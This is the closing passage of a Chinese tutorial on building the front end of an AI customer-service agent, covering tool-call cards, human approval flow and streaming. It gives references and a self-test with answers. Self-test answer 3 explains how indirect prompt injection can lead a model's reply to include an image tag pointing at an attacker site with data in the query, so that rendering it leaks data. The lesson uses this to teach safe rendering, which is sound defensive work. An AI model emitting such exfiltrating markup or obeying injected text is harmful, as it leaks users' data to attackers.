- [Simon Willison · Markdown 图片外泄](https://simonwillison.net/tags/markdown-exfiltration/):他这几年收集的真实案例,各家产品是怎么被「回复里的图片」把数据带出去的。英文,挑两三篇看。
- [React · 通用组件(dangerouslySetInnerHTML)](https://react.dev/reference/react-dom/components/common):官方文档里关于这个属性的警告,搜页面里的 dangerouslySetInnerHTML。
- [MDN · rel=noopener](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Reference/Attributes/rel/noopener):中文,一页。
- [React · form](https://react.dev/reference/react-dom/components/form):form action 的官方说明。
- [AI SDK · Chatbot Tool Usage](https://ai-sdk.dev/docs/ai-sdk-ui/chatbot-tool-usage):AI SDK 怎么在消息里渲染工具调用和工具审批,和我们手写的 ToolCard、审批卡片对照着看,Day 474 会正式用。
- [Nielsen Norman Group · Progress Indicators](https://www.nngroup.com/articles/progress-indicators/):英文,讲等待超过几秒时该给用户看什么,解释了为什么 9 秒的空白比显示步骤糟糕得多。

### B 站视频

- blackstone_99《流式渲染深度实战:从 ReadableStream 到生成式 UI》:上面嵌入的那个。

<figure class="video">
<div class="video-frame"><iframe src="https://player.bilibili.com/player.html?bvid=BV1nZpd6nEsF&autoplay=0&high_quality=1" title="DeepSeek Harness 新玩法get✅ ——装个OpenTiny dsh‑genui插件，AI 输出直接升级成交互界面" loading="lazy" scrolling="no" allowfullscreen></iframe></div>
<figcaption>OpenTiny社区 · 装个 OpenTiny dsh-genui 插件,AI 输出直接升级成交互界面 · 5 分钟,2026 年。国内团队做的生成式 UI 插件演示,看别人怎么把模型输出变成卡片和表单。注意它是让模型决定画什么组件,和我们「组件固定、只填数据」是两种思路,安全上的考虑也不一样。</figcaption>
</figure>

### 其他经典视频

<figure class="video">
<div class="video-frame"><iframe src="https://www.youtube-nocookie.com/embed/hCMrEfPG2Yg" title="Beyond Components: Designing Generative UI for MCP Apps — Ruben Casas, Postman" loading="lazy" allow="accelerometer; encrypted-media; picture-in-picture" allowfullscreen></iframe></div>
<figcaption>AI Engineer · Beyond Components: Designing Generative UI for MCP Apps(Ruben Casas, Postman)· AI Engineer 大会的讲座,讲 Agent 的工具结果怎么变成界面、哪些交互要留给人来确认。英文,开字幕看。</figcaption>
</figure>

### 书籍

今天这组不需要。组件写法你已经会了,Agent 界面的安全和交互,上面的 OWASP 条目和几篇文章比书新。

### 开源项目与代码

- [vercel/ai-chatbot](https://github.com/vercel/ai-chatbot):Vercel 官方的 Next.js 聊天模板,看它的消息组件怎么渲染工具调用和引用。
- [assistant-ui/assistant-ui](https://github.com/assistant-ui/assistant-ui):专门做 AI 聊天界面的 React 组件库,工具调用卡片、审批按钮都有现成的,想省事可以直接用。
- [CopilotKit/CopilotKit](https://github.com/CopilotKit/CopilotKit):另一个 Agent 前端框架,人在回路的审批交互做得比较完整,看它的 human-in-the-loop 示例。

## 自测

1. RunView 的正文什么时候显示 draft、什么时候显示 summary.reply?两者有什么不同?

<details><summary>答案</summary>

收到 done 之前、或者 done 里 reply 是 null(停在审批)时显示 draft;有 reply 就显示 reply。draft 是模型逐字推的原文,引用是 `[KB-refund-001]` 这种文章编号;reply 是 finalize 拼好的定稿,编号换成了 `[1]`、文末有参考文章,审批通过后还有「补充」。质检退回过的话,草稿和定稿的内容也不同。

</details>

2. 工具卡片里 create_refund_request 为什么要和查询分开显示?把 `PROPOSE` 集合删掉,安全性会变差吗?

<details><summary>答案</summary>

它会在业务库里留下一条要人审批的申请,是有后果的操作,客服排查时要一眼看到 Agent 做了哪些「动手」的事。删掉集合只影响颜色和标签,安全性不变:模型能调哪些工具是后端 `openai_tools` 决定的,前端不是安全边界。

</details>

3. 为什么模型的回复不能用 dangerouslySetInnerHTML 或 Markdown 渲染库显示?我们的引用链接从哪来?

<details><summary>答案</summary>

模型的输入里可能有攻击者写的文字(间接注入),回复里就可能出现 `<img src="攻击者网站?q=数据">` 或 Markdown 图片,一渲染浏览器就自动请求,数据被带出去。练习 1 实测用 dangerouslySetInnerHTML 时出现了真的 `<img` 标签。引用链接是后端 `render_sources()` 用检索结果里的标题和路径拼的,前端只认「[n] 标题 http(s) 链接」这个固定格式,其余全当纯文本。

</details>

4. 客户页面停在 waiting_approval 时,为什么要锁住输入框?审批完成后客户怎么知道?

<details><summary>答案</summary>

后端在等审批时追问会返回 409,不锁的话客户发出去才撞上错误。锁住并说明原因,体验更好。审批发生在客服的页面里,客户这边点「刷新进展」,用 GET /tickets/{id} 拿到摘要,当成 done 塞进 reducer,状态变成已完成、输入框解锁。生产上更好的做法是后端主动推。

</details>

5. 面试题:你的 Agent 前端里,「人在回路」的审批是怎么做的?有什么没做好的地方?

<details><summary>答案</summary>

示范回答:后端的工作流在退款节点用 LangGraph 的 interrupt 停下,状态存在 Postgres 的 checkpoint 里。客户页面收到 interrupt 和 done 后显示「已提交审批」,锁住输入框,正文标明是草稿。客服工作台从 `/approvals` 拉待审批列表,每张卡片自己持有一个 reducer,点通过或驳回会发一个 POST 的流式请求,后端用 `Command(resume=...)` 恢复工作流,恢复后的 approval 和 finalize 两个节点就在卡片里跑完,客服能看到定稿的回复和最终花费。按钮点过就收起来,后端对重复审批也返回 409。审批人和备注会写进审计日志,备注还会拼进给客户的回复,所以输入框上提示了。超过复核线的申请标红,阈值由后端算好返回,前端不存。没做好的地方有两个:一是客服批之前看不到要发给客户的草稿,批的是钱,发出去的却是那段话;二是客户那边要手动刷新进展,没有推送。

</details>

6. 第六步里,客服点「通过」后 0.17 秒就完成了,花费也没变。为什么?

<details><summary>答案</summary>

审批恢复只跑 approval 和 finalize 两个节点:approval 执行退款决定、拼「补充」,finalize 拼引用、写工单结局,都不调模型,所以快、也不花钱。0.0258 是 checkpoint 里第一次处理时累计的成本。

</details>

## 明天预告

明天是 [Day 471](/blog/agent-zero/day-471-ui-robust/),界面(四):停止和断线、可访问性、假后端。今天的页面在网络好、后端不出错的时候是对的。明天看几种不顺利的情况:用户点了停止,后端那张工单是继续跑还是停下;网络断了,客户怎么接回正在跑的那一轮;读屏软件用户能不能用这个页面。最后把 Day 469 那个只会回放一段录音的服务器,换成一个能模拟各种情况(出错、慢、质检退回、转人工)的假后端,调界面再也不用花钱。
